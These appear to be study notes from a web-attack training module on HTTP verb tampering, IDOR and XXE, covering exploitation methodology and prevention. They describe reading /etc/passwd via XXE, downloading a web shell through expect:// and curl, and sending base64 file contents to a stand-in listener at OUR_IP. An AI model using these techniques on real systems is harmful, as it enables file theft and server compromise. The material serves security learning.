# Introduction to Web Attacks 

## HTTP Verb Tampering

This attack abuses web servers that accept multiple HTTP methods. Applications often enforce authorization checks only on expected methods (usually GET and POST).

If a developer protects a resource against unauthorized POST requests but forgets to restrict PUT or DELETE, an attacker can switch the HTTP method to bypass security controls.

Attacker mindset:

- Identify restricted functionality
    
- Change the HTTP method
    
- Observe differences in behavior
    
- Look for missing access control validation per verb
    

This fits into methodology under:  
Recon → Identify endpoint → Manipulate HTTP method → Authorization bypass testing

Common pitfalls:

- Assuming access control is applied globally
    
- Not testing all available HTTP verbs
    
- Forgetting preflight OPTIONS checks
    

## Insecure Direct Object References (IDOR)

IDOR occurs when an application exposes internal object identifiers (such as user IDs, file IDs, invoice numbers) without validating ownership.

If the backend only checks whether the object exists — instead of verifying that the requester is authorized to access it — attackers can enumerate IDs to access other users' data.

Attacker mindset:

- Identify numeric or predictable parameters
    
- Increment/decrement values
    
- Attempt horizontal privilege escalation
    
- Look for missing access control enforcement on backend
    

This fits into methodology under:  
Parameter analysis → ID pattern recognition → Enumeration → Authorization validation testing

Common pitfalls:

- Assuming obscurity equals security
    
- Only testing with one user role
    
- Ignoring API endpoints
    

## XML External Entity (XXE) Injection

XXE occurs when an XML parser processes user-supplied XML and allows external entity resolution.

If external entities are enabled, attackers can:

- Read local server files
    
- Access internal network services
    
- Extract sensitive configuration files
    
- Potentially escalate to remote code execution
    

Attacker mindset:

- Identify XML input processing
    
- Inject malicious DOCTYPE declarations
    
- Attempt file retrieval
    
- Escalate impact via sensitive file disclosure
    

This fits into methodology under:  
Input format identification → Parser behavior testing → Entity injection → Data exfiltration

Common pitfalls:

- Testing only JSON endpoints
    
- Ignoring file upload features
    
- Overlooking SOAP or legacy XML services
    

---

This module focuses on three core web attack classes that target authorization weaknesses, backend object handling flaws, and insecure XML parsing — all extremely common in real-world environments.


# Bypassing Basic Authentication

## Target Endpoint

The reset functionality is located at `/admin/reset.php`, and the entire `/admin` directory is protected with HTTP Basic Authentication.

This tells us the protection is enforced at the web server configuration level rather than purely in application logic.

## OPTIONS Method Enumeration

An OPTIONS request is used to identify which HTTP methods the server allows.

The presence of `HEAD` in the `Allow` header indicates the server accepts HEAD requests.

This is critical because authentication may only be enforced for certain HTTP methods.

## HEAD Request to Bypass Authentication

HEAD behaves like GET but does not return a response body.

The vulnerability occurs because:

- Authentication is enforced for GET and POST
    
- HEAD is allowed by the server
    
- The server executes the underlying PHP script
    
- The authentication check does not properly block HEAD requests
    

As a result:

- The reset function executes
    
- Files are deleted
    
- No login prompt appears
    
- No response body is returned
    

This demonstrates insecure web server configuration where method-level access control is inconsistent.

## Burp Suite Action

Using “Change Request Method → HEAD” allows quick testing of alternate HTTP verbs without rewriting the request manually.

This step highlights attacker methodology:

1. Identify restricted endpoint
    
2. Intercept request
    
3. Enumerate allowed HTTP methods
    
4. Swap method
    
5. Observe behavior differences
    
6. Confirm functionality execution
    

This attack falls under:  
Authorization Bypass → HTTP Method Manipulation → Server Misconfiguration Exploitation

Common mistakes:

- Only testing GET and POST
    
- Ignoring HEAD method
    
- Not checking OPTIONS responses
    
- Assuming Basic Auth applies uniformly across all verbs
- # 
# Bypassing Security Filters 

## What the filter is doing

The “Malicious Request Denied!” message indicates a backend security filter is detecting suspicious characters (like `;`) and blocking the request before the filename is processed. The key detail is that these filters are often implemented in a method-specific way (for example, only validating `POST` variables and ignoring `GET` query parameters).

## Why HTTP verb tampering works here

The application’s filter logic is applied inconsistently across HTTP methods. When the request method is changed, the request may still reach the same backend file-creation logic, but bypass the specific validation path that was blocking the malicious input.

In other words:

- One request method triggers filtering and blocks the input.
    
- Another request method still reaches the same functionality but skips (or partially skips) the filter.
    

## How the exploit is confirmed

Creating a filename containing command separators is not, by itself, proof of command injection. The confirmation step is using a filename that attempts to execute an additional command that produces a visible side effect (like creating a second file). If both artifacts appear, it demonstrates the server interpreted the injected shell metacharacters and executed extra commands.

## How this chains into flag retrieval

Once command injection is confirmed and the security filter is bypassed via HTTP verb tampering, the next step is to use the provided filename payload from the exercise prompt to perform a file operation that copies the flag into a web-accessible directory.

## Common pitfalls

- Assuming a blocked payload means “no injection exists” rather than “filter exists.”
    
- Not verifying execution with a side effect (false positives).
    
- Forgetting that method changes can alter which backend superglobal/handler processes input (e.g., GET vs POST), which is exactly what makes this class of bug possible.
- 
- #
# Verb Tampering Prevention 
## Insecure Configuration

All three server examples demonstrate the same root issue: authorization is restricted to a single HTTP method (GET).

This creates a method-scoping flaw:

- Authentication applies only to GET.
    
- Other verbs (POST, HEAD, OPTIONS, etc.) remain unprotected.
    
- The server still executes backend logic when those verbs are used.
    

The vulnerability exists because access control is tied to specific HTTP methods instead of being applied universally to the protected resource.

The secure design principle is:  
Authorization should protect the resource itself — not just certain request methods.

Safer configuration approaches:

- Use directives that deny all methods except explicitly allowed ones.
    
- Avoid method-specific authentication unless absolutely necessary.
    
- Disable HEAD if not required.
    
- Ensure consistent enforcement across all HTTP verbs.
    

## Insecure Coding

The PHP example demonstrates a logic flaw caused by inconsistent parameter handling.

Key issue:

- The filter validates `$_POST['filename']`
    
- The command executes `$_REQUEST['filename']`
    

Since `$_REQUEST` includes both GET and POST parameters:

- A malicious value sent via GET bypasses the POST-only filter.
    
- The system() call still executes the GET parameter.
    
- This results in command injection despite the presence of a filter.
    

This is not a failure of regex filtering.  
It is a failure of method consistency.

The core vulnerability class here is:  
Input validation scope mismatch.

## Why This Happens in Real Applications

In production systems:

- Validation functions are often separated from execution logic.
    
- Different developers write different components.
    
- Security filters may assume a specific HTTP method.
    
- Business logic may accept input from a broader scope.
    

This creates invisible trust boundaries inside the application.

## Secure Development Principles

To prevent HTTP Verb Tampering vulnerabilities:

1. Apply authorization checks independently of HTTP method.
    
2. Ensure input validation covers all request sources.
    
3. Use consistent parameter access methods.
    
4. Avoid mixing method-specific superglobals unless explicitly required.
    
5. Centralize validation logic.
    

When validation covers all request parameters uniformly, filter bypass via verb tampering becomes impossible.

This section reinforces an important exploitation mindset:  
Attackers look for inconsistencies.  
Defenders must enforce consistency.



# Intro to IDOR 

## What IDOR Is

Insecure Direct Object Reference (IDOR) occurs when a web application exposes a reference to an internal object (such as a file, database record, or user ID) and fails to properly enforce access control on the backend.

The vulnerability is not the exposure of the identifier itself.  
The vulnerability is the absence of proper authorization checks when that identifier is used.

## Core Condition for IDOR

An IDOR exists when:

1. A user can control a direct reference (e.g., file_id=123).
    
2. The backend does not verify ownership or authorization.
    
3. Changing the identifier grants access to unauthorized data.
    

The problem is not guessable IDs alone — it is missing backend validation.

## Why IDOR Is So Common

Access control is difficult to implement correctly because:

- Authorization logic must be consistent across all endpoints.
    
- Backend must validate every request independently.
    
- Frontend restrictions are not security controls.
    
- Automated scanners struggle to detect logical access flaws.
    

Many developers rely on:

- Hiding admin buttons
    
- Removing UI elements
    
- Assuming users won’t manipulate requests
    

Attackers manually modify requests, bypassing frontend limitations entirely.

## Attacker Mindset

When identifying IDOR:

1. Look for numeric or predictable identifiers.
    
2. Modify them incrementally.
    
3. Observe response differences.
    
4. Check for unauthorized access to other users' data.
    

The key goal:  
Horizontal privilege escalation (accessing other users’ data).

In more severe cases:  
Vertical privilege escalation (calling admin-only functions).

## Types of IDOR Impact

### 1. Information Disclosure

Accessing:

- Private files
    
- Profile data
    
- Financial information
    
- Internal documents
    

### 2. Data Modification

If write operations are exposed:

- Editing other users’ data
    
- Deleting resources
    
- Resetting passwords
    

### 3. Privilege Escalation

If admin-only functions are exposed through parameters or APIs and backend lacks role validation:

- Role manipulation
    
- Account takeover
    
- Full application compromise
    

## Why Backend Access Control Is Critical

A secure system must:

- Verify the authenticated user.
    
- Check whether that user is authorized to access the specific object.
    
- Enforce role-based restrictions consistently.
    
- Never rely on frontend logic for protection.
    

Even large platforms suffer from IDOR because access control logic is complex and easy to implement inconsistently.

## Methodology Placement

IDOR testing fits into:

Parameter Analysis → Identifier Manipulation → Authorization Testing → Privilege Escalation Testing

This vulnerability class is fundamentally about broken access control, which is one of the most critical categories in modern web security.

# Identifying IDORs 

## URL Parameters & APIs

The first indicator of IDOR is a user-controlled object reference such as:

- Numeric IDs
    
- Filenames
    
- Database record identifiers
    
- API resource paths
    

When identifiers are predictable (incremental numbers, structured filenames), attackers test adjacent or sequential values to check whether unauthorized data can be accessed.

Successful access to another user's resource confirms broken backend access control.

This is horizontal privilege escalation.

## AJAX Calls

Modern web applications frequently define all functionality in front-end JavaScript.

Even if certain features are hidden in the UI:

- The API endpoints may still exist.
    
- The backend may still process them.
    
- Authorization may not be enforced properly.
    

By reviewing JavaScript:

- Hidden endpoints can be discovered.
    
- Direct object references inside AJAX calls can be identified.
    
- Admin-only functions can sometimes be invoked directly.
    

The vulnerability exists if:

- The backend accepts the request.
    
- The session is valid.
    
- No role validation is performed.
    

## Encoded References

Encoding (like Base64) is not security.

If object references are encoded:

- Decode the value.
    
- Modify the underlying identifier.
    
- Re-encode it.
    
- Test access.
    

If access is granted to unauthorized data, it confirms IDOR.

Encoding only obscures identifiers. It does not enforce authorization.

## Hashed References

Hashing may appear secure but is often reversible in logic.

If:

- The hashing algorithm is known.
    
- The input format is predictable.
    
- The source code reveals how the hash is generated.
    

Then attackers can compute valid hashes for other resources.

If the backend does not validate ownership after hash verification, it remains vulnerable.

Security principle:  
Hash validation ≠ Authorization validation.

## Comparing User Roles

More advanced IDOR testing involves:

1. Creating multiple accounts.
    
2. Comparing requests between roles.
    
3. Identifying differences in object references.
    
4. Replaying privileged requests as a lower-privileged user.
    

If the backend:

- Only checks for a valid session
    
- Does not verify object ownership
    
- Does not enforce role restrictions
    

Then IDOR exists.

This can lead to:

- Information disclosure
    
- Unauthorized modification
    
- Privilege escalation
    
- Account takeover
    

## Attacker Methodology

Identification process:

1. Enumerate object references.
    
2. Test sequential values.
    
3. Analyze front-end JavaScript.
    
4. Decode encoded identifiers.
    
5. Recalculate hashed identifiers.
    
6. Compare user roles.
    
7. Replay privileged API calls.
    

IDOR is fundamentally a backend authorization failure, not an identifier exposure problem.

The core question is always:  
"Does the backend verify that this user is allowed to access this specific object?"# 

# Mass IDOR Enumeration 

## Insecure Parameters

This scenario demonstrates a classic IDOR pattern: a user-controlled identifier (`uid`) determines which employee’s documents are displayed. If the backend does not verify that the currently logged-in user is authorized to view the requested `uid`, then changing `uid` becomes a direct path to other users’ documents.

A key takeaway is that the page might look “the same” after changing `uid`, so verification should focus on the underlying resource links and their contents, not just the UI.

## Static File IDOR vs Parameter IDOR

The predictable filenames (like `Invoice_<uid>_<month>_<year>.pdf`) are an example of static file IDOR: resources are guessable due to a naming pattern. This can leak some files, but it’s incomplete unless you know every naming convention.

The stronger vulnerability is the direct object reference in the URL (`documents.php?uid=...`), because it can enumerate the application-generated list of documents for each user without guessing filenames.

## Mass Enumeration Workflow

The chain is:

1. Identify a controllable object reference (`uid`).
    
2. Confirm that changing it returns different users’ document links (authorization failure).
    
3. Extract the document paths from the HTML response.
    
4. Automate enumeration across a range of `uid` values.
    
5. Download every discovered document for offline review.
    

The regex extraction step is important because it pulls only the meaningful parts (the `/documents/...pdf` paths) from the HTML, making the automation simpler and less error-prone.

## Why the script works

The script loops through a range of `uid` values, fetches each documents page, extracts any document links matching the pattern, then downloads them. If the backend lacks access control, the script effectively turns a single IDOR into mass data exposure.

## Common pitfalls

- Trusting the page layout instead of verifying the returned file links.
    
- Assuming predictable filenames are the only path, and missing parameter-based IDOR.
    
- Using overly rigid parsing (exact HTML strings) instead of extracting by pattern.
    
- Forgetting that real targets may require authenticated sessions/cookies for `curl` to work, even if the lab simplifies it.



# Bypassing Encoded References 

## What’s being protected and what’s exposed

The application avoids direct links to contract files by using a download endpoint (`/download.php`) that accepts a `contract` value (see **Intercepted POST Parameter**). This is intended to prevent simple URL guessing.

The flaw is that the “secret” reference isn’t actually secret: it’s computed on the client side, and the computation is disclosed in front-end JavaScript (see **downloadContract Function**).

## Why the reference looks secure but isn’t

An MD5 hash looks like a strong, non-guessable identifier. However, a hash is only as secure as the secrecy and unpredictability of its input.

Because the input is derived deterministically from `uid`, and the exact transformation is shown in the client code, attackers can reproduce valid `contract` values for other users.

Key idea: hashing is not authorization.

## How the function disclosure breaks the scheme

The `downloadContract(uid)` logic shows a reversible recipe:

1. Take the user ID.
    
2. Base64-encode it (`btoa(uid)`).
    
3. MD5-hash the base64 output.
    

That means you can generate valid `contract` identifiers for any employee ID you choose. This converts a “Secure Direct Object Reference” into an IDOR because the backend still doesn’t enforce access control for which user is allowed to download which contract.

## Why “MD5 of uid” doesn’t match but “Base64 then MD5” does

The initial attempt (see **MD5 of UID Attempt**) fails because it’s hashing the raw ID.

The correct match (see **Base64 Then MD5 Match**) works because the client first base64-encodes the ID and then hashes it, so the server receives the MD5 of the base64 string, not the MD5 of the plain integer.

## How this enables mass enumeration

Once the scheme is understood, mass access is just repeated generation and repeated download requests:

- **Hash Generation Loop (First 10)** shows bulk derivation of valid identifiers.
    
- **Mass Download Script (1..10)** operationalizes the IDOR by posting computed `contract` values to `/download.php`.
    

This is a standard escalation pattern:  
Single-object IDOR → predictable reference derivation → automated multi-object extraction.

## Common pitfalls

- Treating hashed identifiers as “secure” without checking whether the hash input is guessable or disclosed.
    
- Focusing only on decoding hashes (impossible) instead of reproducing the same hashing process.
    
- Missing the front-end source code path (`javascript:downloadContract('1')`) that reveals the entire derivation chain.
    
- Assuming a download gateway endpoint implies authorization is enforced server-side (it often isn’t).

# IDOR in Insecure APIs 

## What “IDOR in APIs” means

IDOR is not limited to downloading files. APIs often expose direct object references through:

- URL paths (e.g., `/profile/.../1`)
    
- JSON fields (e.g., `"uid": 1`)
    
- Cookies used for authorization (e.g., `role=employee`)
    

When those references control which user object is read or modified, and the backend does not enforce authorization, the API becomes exploitable.

## What makes this API “insecure”

Two major issues are present in the design:

1. **Client-side role control**  
    The user’s privilege level is reflected in a client-controlled cookie (`role=employee`) and echoed in the JSON body (`"role": "employee"`). If backend authorization trusts either of these, attackers can attempt privilege escalation by modifying them.
    
2. **Direct user object targeting**  
    The endpoint path includes a user identifier (`/profile/.../1`). This is a direct reference that could be manipulated to target other users if authorization checks are weak.
    

## What the backend is doing (partial controls)

Your attempts failing shows the backend has some validation layers:

- **UID mismatch**  
    The server appears to require the JSON `"uid"` to match the user ID in the endpoint path. This prevents trivial ID swaps that would otherwise allow modifying other users.
    
- **UUID mismatch**  
    When targeting another user’s endpoint, the server checks the supplied `"uuid"` against that user’s UUID. Since you only know your own UUID, you cannot pass this check to edit other users’ profiles.
    
- **Admin-only actions**  
    Creating users (POST) and deleting users (DELETE) are restricted by role checks.
    
- **Role validation**  
    Arbitrary strings like `admin`/`administrator` are rejected, suggesting the backend validates role values against an allowlist.
    

These checks make the “insecure function call” path harder, but they do not prove the API is fully secure.

## The key next test: GET-based information disclosure

Even if the server blocks unauthorized writes (PUT/POST/DELETE), it may still allow unauthorized reads (GET). That’s the classic pattern:

- **Information disclosure IDOR (GET)**  
    Leak another user’s details (including their UUID).
    
- **Then insecure function call IDOR (PUT/POST/DELETE)**  
    Use leaked UUID or role info to modify that user or escalate privileges.
    

This chaining is common because developers often harden write paths but forget to enforce the same authorization checks on read endpoints.

## Why leaking UUID matters

In this specific flow, UUID functions like a “secondary secret” used for authorization. If GET requests reveal UUIDs for other users, then the UUID mismatch protection becomes useless, because an attacker can:

- retrieve someone else’s UUID
    
- replay a PUT request with matching uid/uuid
    
- modify their profile data
    

## Methodology fit

This section illustrates a realistic approach to API IDOR:

1. Identify object references in path/body/cookies.
    
2. Probe write operations for controls and error messages.
    
3. Probe read operations for information disclosure.
    
4. Chain leaked identifiers into state-changing requests.
    

## Common pitfalls

- Assuming PUT protections imply GET protections exist (often false).
    
- Treating UUIDs as secure secrets while still exposing them via API reads.
    
- Trusting role cookies or role fields from the client instead of server-side session roles.
    
- Validating role strings but not validating the caller’s authorization to set them.



# Chaining IDOR Vulnerabilities 

## Information disclosure IDOR creates the missing key

The API returns full user objects via GET while relying only on a role cookie for “authorization.” Because the backend does not enforce per-user access checks, requesting a different user identifier returns that user’s profile, including the `uuid`. That `uuid` is the critical secret-like value that previously prevented cross-user updates.

## Second-stage IDOR: insecure function calls using leaked UUID

The backend blocks unauthorized PUTs with “uuid mismatch” when you try to update another user without knowing their UUID. Once the UUID is leaked via the GET IDOR, you can craft a valid PUT that passes the server’s checks (matching `uid` + matching `uuid`) and modify another user’s profile fields. This chains:

Read (IDOR disclosure) → Write (IDOR function call)

## Role discovery enables privilege escalation

Enumerating user objects eventually reveals an admin-like role string (`web_admin`). Earlier role-change attempts failed due to “Invalid role” because the server validates role names against an allowlist. Once the correct role name is discovered, setting your own role to `web_admin` succeeds because the backend fails to enforce authorization around who is permitted to assign roles.

This is a classic broken access control pattern:

- Backend validates role _format/value_
    
- Backend does not validate role _assignment permission_
    

## Why this becomes full administrative control

After your role is set to `web_admin`, privileged API actions (like creating new employees) become available because authorization decisions are tied to the client-supplied role/cookie rather than a server-side permission model.

## Why changing the admin email is impactful

Modifying an admin’s email (e.g., to `flag@idor.htb`) demonstrates unauthorized modification of a privileged account’s recovery/contact channel. In real systems, this often enables takeover via password reset flows or other email-based verification, turning an IDOR chain into an account takeover path.

## Common pitfalls

- Stopping after failed PUT attempts and missing that GET may still be wide open.
    
- Treating UUIDs as secure “secrets” while exposing them via readable endpoints.
    
- Confusing “valid role name” checks with “authorized to become that role.”
    
- Assuming a role cookie implies server-side authorization (it often implies the opposite).

# IDOR Prevention 

## Core Fix: Object-Level Access Control

The primary cause of IDOR is broken access control, not predictable identifiers. The solution begins with implementing object-level authorization checks on the backend.

In a proper RBAC model:

- Every authenticated user is mapped to roles and privileges server-side.
    
- Each request is evaluated against the requested object.
    
- Access is granted only if the user owns the object or has sufficient privileges (e.g., admin).
    

The RBAC example rule demonstrates:

- Authentication check (`user.isAuth`)
    
- Ownership validation (`user.uid == userId`)
    
- Privileged override (`admin` role)
    

Critically, roles must be derived from server-side session/token validation, not from client-controlled values like cookies or JSON parameters.

## Why Client-Side Role Storage Is Dangerous

In earlier attacks:

- Role was stored in a cookie.
    
- Role was included in JSON payload.
    
- Server trusted client-supplied role values.
    

This design enables privilege escalation. Secure design requires:

- Roles stored and validated exclusively on the server.
    
- Client input never trusted for authorization decisions.
    

## Object Referencing Best Practices

Even with strong access control, object identifiers should not be easily guessable.

Weak reference:

- Sequential numeric IDs (e.g., `uid=1`).
    

Stronger reference:

- Randomized UUIDs.
    
- Properly generated unique identifiers stored server-side.
    
- Mapped to actual records in the database.
    

However, unique identifiers alone do not prevent IDOR. They only reduce enumeration ease. If access control is broken, UUIDs can still be abused by replaying legitimate requests across sessions.

## Why Front-End Hashing Is Unsafe

Earlier, hashes were computed in JavaScript. This exposes:

- The hashing algorithm.
    
- The input format.
    
- The transformation logic.
    

Secure practice:

- Generate and store identifiers server-side.
    
- Never derive security-sensitive references in front-end code.
    
- Never rely on obscurity (encoding/hashing) instead of authorization.
    

## Secure Design Principles

To prevent IDOR:

1. Enforce object-level authorization for every request.
    
2. Derive roles and permissions from server-side session validation.
    
3. Never trust client-controlled role fields or cookies.
    
4. Avoid predictable identifiers.
    
5. Avoid front-end-generated security tokens.
    
6. Log and test authorization logic thoroughly.
    

## Important Insight

Strong object referencing is secondary.  
Strong access control is mandatory.

If both are implemented correctly:

- Enumeration becomes difficult.
    
- Unauthorized access becomes impossible.
    
- IDOR vulnerabilities are effectively mitigated.
    

This section reinforces the fundamental rule of web security:

Authorization must always be enforced on the backend, per object, per request.
# Intro to XXE 

## What XXE Is

XML External Entity (XXE) Injection occurs when an application parses user-supplied XML and allows external entities to be resolved. If entity resolution is enabled and unfiltered, attackers can reference local or remote resources inside XML input.

The root issue is unsafe XML parsing, not XML itself.

## Why XML Matters

XML is structured data, not just markup. It supports:

- Elements (tags and content)
    
- Attributes
    
- Declarations
    
- Document Type Definitions (DTD)
    
- Entities (variables)
    

The powerful features that make XML flexible are also what make XXE possible.

## Role of DTDs

A DTD defines the structure of an XML document. It can:

- Define valid elements
    
- Define allowed child relationships
    
- Define custom entities
    

DTDs can be:

- Embedded directly in the XML document (internal DTD)
    
- Loaded from a local file
    
- Loaded from a remote URL
    

When an XML parser processes a DTD, it may fetch and process external resources referenced inside it.

This is the core of XXE exploitation.

## XML Entities

Entities act like variables inside XML. When the parser encounters:

&entityName;

It replaces it with the entity’s value.

There are two types relevant to XXE:

1. Internal entities  
    Defined directly in the document.
    
2. External entities  
    Loaded via SYSTEM or PUBLIC and referencing:
    
    - Local files (file://)
        
    - Remote URLs (http://)
        

If external entity resolution is enabled, referencing:

file:///var/www/html/signature.txt

may cause the server to read and include the file’s contents during XML parsing.

## Why This Is Dangerous

When XML is parsed server-side (e.g., SOAP APIs, file uploads, XML-based forms):

- The server processes the DTD.
    
- External entities may be resolved.
    
- Local files may be read.
    
- Internal services may be contacted.
    
- Sensitive data may be returned in the response.
    

This can lead to:

- Local file disclosure
    
- SSRF (Server-Side Request Forgery)
    
- Credential leakage
    
- Source code disclosure
    
- Denial of service
    

## Key Exploitation Principle

XXE works because:

1. The application accepts XML input.
    
2. The parser allows DTD processing.
    
3. External entity resolution is enabled.
    
4. User input controls the XML structure.
    

If all four conditions are present, the parser may execute attacker-controlled entity definitions.

## Important Security Insight

Like IDOR and Verb Tampering, XXE is not about syntax tricks — it is about unsafe backend behavior.

The core flaw is:

Trusting user-supplied structured data without disabling dangerous parser features.

In the next sections, this theoretical understanding will be used to:

- Read local files
    
- Perform advanced disclosures
    
- Exfiltrate data blindly

# Local File Disclosure 

## Identifying XXE Injection Points

The first requirement for XXE is XML input processing. The contact form submits structured XML to `/submitDetails.php`, making it a candidate for testing.

If the application reflects XML element values (like `<email>`) in the response, that element becomes an injection sink where entity expansion results can be observed.

## Confirming XXE via Internal Entity Injection

The initial test defines an internal entity (`company`) and references it inside `<email>`.

If:

- The response prints the entity’s resolved value,
    
- Instead of printing `&company;` literally,
    

Then the parser is resolving entities and DTD processing is enabled. This confirms XXE viability.

## Reading Local Files

Switching from an internal entity to an external entity with:

file:///etc/passwd

forces the XML parser to:

1. Access the local filesystem.
    
2. Read the referenced file.
    
3. Insert its contents into the XML document during parsing.
    
4. Reflect it in the response.
    

This is classic XXE Local File Disclosure.

## Why PHP Source Code Fails Directly

When trying to read `index.php` directly:

- Special characters break XML parsing.
    
- Non-XML-compliant content may not render.
    
- Binary or structured syntax interferes with entity expansion.
    

To bypass this, PHP’s `php://filter` wrapper encodes the file in base64 before inclusion. Base64:

- Contains only safe ASCII characters.
    
- Does not break XML syntax.
    
- Can be decoded locally to retrieve source code.
    

This allows white-box analysis of backend code.

## Remote Code Execution via XXE

If the `expect` wrapper is enabled:

- `expect://` allows command execution.
    
- Injecting `curl` downloads a remote web shell.
    
- Web shell allows interactive command execution.
    

Limitations:

- `expect` is often disabled.
    
- XML syntax restrictions break complex commands.
    
- Modern environments reduce likelihood of success.
    

XXE → RCE is possible but environment-dependent.

## SSRF Through XXE

Since SYSTEM can reference URLs:

- Internal services can be queried.
    
- Localhost ports can be enumerated.
    
- Internal APIs may be accessed.
    

This converts XXE into SSRF.

## Denial of Service (Billion Laughs)

The recursive entity payload expands exponentially in memory:

- Nested entity references multiply content size.
    
- Parser memory exhaustion occurs.
    
- Service becomes unavailable.
    

Modern parsers typically disable recursive entity expansion or limit entity depth, mitigating this attack.

## Exploitation Flow Summary

1. Identify XML input.
    
2. Confirm entity expansion with internal entity.
    
3. Switch to external entity for file read.
    
4. Use wrappers (like php://filter) for structured/binary files.
    
5. Escalate to SSRF or RCE if possible.
    
6. Optionally test DoS vectors.
    

The core vulnerability is unsafe XML parsing with external entity resolution enabled.






# Advanced File Disclosure 
## Why Basic XXE Sometimes Fails

Standard external entity inclusion works only when:

- The file content is XML-safe.
    
- The application reflects entity output.
    
- No parser protections interfere.
    

Files like PHP source may contain characters (`<`, `>`, `&`) that break XML parsing. In other cases, the application may not reflect entity values at all, creating a blind scenario.

These limitations require more advanced techniques.

---

## CDATA-Based Advanced Exfiltration

CDATA allows raw content inside XML:

```
<![CDATA[ ... ]]>
```

Anything inside CDATA is treated as literal text, even if it contains special characters.

The challenge:  
XML does not allow direct concatenation of internal and external entities.

The workaround:  
Use **parameter entities (%)** inside a DTD.

By hosting an external DTD:

- All entities become external.
    
- They can be concatenated.
    
- File content can be wrapped inside CDATA safely.
    

Flow:

1. Define `%begin`, `%file`, `%end`
    
2. Host a DTD that joins them
    
3. Load the DTD remotely
    
4. Reference the combined entity
    

This method:

- Works across many frameworks
    
- Avoids base64 encoding
    
- Preserves readable source code
    

---

## Error-Based XXE (When No Output Exists)

Sometimes:

- The application does not reflect XML data
    
- No entity output is visible
    

If error messages are displayed, we can trigger an XML parsing error and inject file content into the error message.

Technique:

1. Define `%file` referencing the target file
    
2. Create a malformed entity reference using a non-existing entity
    
3. Force the parser to throw an error
    
4. The error includes expanded entity data
    

The parser attempts to resolve:

```
%nonExistingEntity;/%file;
```

Since the first entity doesn't exist, an error is thrown.  
The error message includes the expanded `%file;` content.

This turns runtime errors into data exfiltration channels.

---

## Comparing Methods

|Method|Requires Output Reflection|Works with Special Characters|Reliability|
|---|---|---|---|
|Basic XXE|Yes|No|Moderate|
|PHP Filter|Yes|Yes (Base64)|PHP-only|
|CDATA + External DTD|Yes|Yes|High|
|Error-Based|No (needs errors)|Partial|Moderate|

---

## Why This Is Powerful

These techniques allow:

- Reading PHP source code
    
- Extracting API keys
    
- Dumping configuration files
    
- Reading `/flag.php`
    
- Extracting credentials
    
- Performing whitebox analysis
    

Advanced XXE turns a simple XML parsing flaw into full backend visibility.

---

## Key Security Insight

XXE severity depends on:

- Whether DTD processing is enabled
    
- Whether external entities are allowed
    
- Whether error messages are exposed
    
- Whether output reflection exists
    

Disabling external entity resolution completely mitigates these attack chains.

---

## Exploitation Strategy

1. Test for basic entity injection.
    
2. Try direct file read.
    
3. If broken → try base64 wrapper (PHP).
    
4. If not PHP → use CDATA + external DTD.
    
5. If no reflection → use error-based XXE.
    
6. Target sensitive files (config, source, keys, flags).
    

This layered approach ensures maximum coverage during testing.
# Blind Data Exfiltration 

## Completely Blind XXE Scenario

In this case:

- No entity output is reflected.
    
- No XML data is returned.
    
- No runtime errors are shown.
    

This eliminates:

- Basic entity reflection
    
- CDATA-based exfiltration
    
- Error-based extraction
    

The only remaining option is **Out-of-Band (OOB) exfiltration**.

---

## Core Concept of OOB XXE

Instead of forcing the application to print file contents in the HTTP response, we:

1. Make the server read a local file.
    
2. Encode it (base64).
    
3. Force the server to send it to our machine via HTTP.
    
4. Capture and decode it locally.
    

The data leaves the target server over a separate network request — hence “out-of-band”.

---

## How the OOB Payload Works

### Step 1: Base64 Encode the File

Using:

php://filter/convert.base64-encode/resource=FILE

This ensures:

- No XML-breaking characters.
    
- Safe transmission over HTTP parameters.
    

### Step 2: Embed Encoded Content in URL

The payload creates an entity that triggers a request like:

http://OUR_IP:8000/?content=BASE64_DATA

The vulnerable server:

- Reads the file.
    
- Encodes it.
    
- Sends it to our listener.
    

---

## Why the PHP Listener Is Used

The custom PHP script:

- Extracts the `content` parameter.
    
- Base64-decodes it.
    
- Prints it to terminal logs.
    

This automates decoding and speeds up analysis.

---

## Why `<root>&content;</root>` Is Required

The entity must be referenced in the XML body to force resolution.

Without referencing `&content;`, the external request is never triggered.

---

## Automated Blind XXE with XXEinjector

Manual OOB works well, but XXEinjector automates:

- External DTD hosting
    
- Entity crafting
    
- Payload injection
    
- Data collection
    
- File reconstruction
    

Workflow:

1. Save request template with `XXEINJECT` marker.
    
2. Specify:
    
    - Target file path
        
    - Listener IP
        
    - OOB method
        
    - Encoding method
        
3. Tool handles DTD + HTTP server.
    
4. Extracted data is saved in Logs directory.
    

---

## Why Base64 Encoding Is Important

Blind exfiltration must:

- Survive URL transmission
    
- Avoid breaking HTTP syntax
    
- Avoid special character corruption
    

Base64 guarantees safe transport.

---

## Advanced Alternative: DNS Exfiltration

Instead of HTTP:

- Encode file content into subdomain.
    
- Server makes DNS lookup.
    
- Attacker captures DNS query.
    
- Decode subdomain to retrieve file.
    

This is stealthier but more complex.

---

## Blind XXE Attack Flow Summary

1. Identify blind XML endpoint.
    
2. Confirm DTD processing is enabled.
    
3. Create external DTD on attacker machine.
    
4. Encode file using php filter.
    
5. Embed encoded file into outbound HTTP request.
    
6. Capture request.
    
7. Decode content.
    
8. Repeat for sensitive files.
    

---

## Why Blind XXE Is Extremely Dangerous

Even without:

- Output reflection
    
- Error messages
    

An attacker can still:

- Extract any readable file.
    
- Dump credentials.
    
- Retrieve source code.
    
- Extract flags.
    
- Chain into RCE.
    

Blind conditions do not prevent exploitation — they only change the exfiltration method.

---

## Security Takeaway

Blind XXE exploitation proves:

Disabling output is not a defense.

Only safe XML parsing (disabling external entity resolution) truly prevents XXE attacks.
# XXE Prevention 

**XML LIBRARY / COMPONENT MANAGEMENT**

The primary cause of XXE vulnerabilities is not usually developer-written XML parsing logic but outdated XML parsing libraries. Applications typically rely on built-in libraries to process XML input, and if those libraries allow external entity resolution, attackers can inject malicious XML entities.

In older environments, developers sometimes enabled unsafe behavior explicitly. A well-known example in PHP is the function responsible for controlling external entity loading. This function became deprecated in PHP 8 because relying on it encourages insecure parsing behavior that can allow XML entities to load local or remote resources.

Therefore, prevention starts with dependency hygiene:

- Updating XML parsing libraries
    
- Updating frameworks and API libraries that internally parse XML
    
- Monitoring package managers and IDE warnings about deprecated functions
    

XML parsing is not limited to XML APIs. Many components process XML behind the scenes, including:

- SOAP APIs
    
- SVG image processors
    
- PDF document generators
    

If these components use outdated parsers, they may introduce XXE vulnerabilities even if the main application code appears secure.

Maintaining updated dependencies is a fundamental part of reducing attack surface across the entire application stack.

**SAFE XML CONFIGURATIONS**

